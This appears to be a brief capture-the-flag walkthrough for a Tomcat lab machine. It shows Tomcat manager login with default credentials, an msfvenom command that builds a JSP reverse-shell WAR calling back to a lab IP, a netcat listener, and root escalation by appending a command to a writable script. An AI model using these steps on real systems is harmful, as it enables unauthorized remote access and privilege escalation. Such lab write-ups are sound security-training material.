Three ports are open 

1. 22/tcp   ssh
2. 8009/tcp ajp13
3. 8080/tcp http

Try to open the page it is tomcat and it has cves. now try logging in manager app with default credentials. <br>
`tomcat` and `s3cret` this can be found on internet. <br>
now you can upload `.war` file so make a payload using msfvenom 
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.86.224 LPORT=1234 -f war > shellllll.war
```
Upload this file and go to that page and then you can get connection on netcat by starting a listener
```bash
nc -lnp 1234
```
and then you are in as a non root user than you can find a id.sh file which is writable so just write this and you will get the root file 
```bash
echo "cp /root/root.txt /home/jack/root.txt" >> id.sh
```
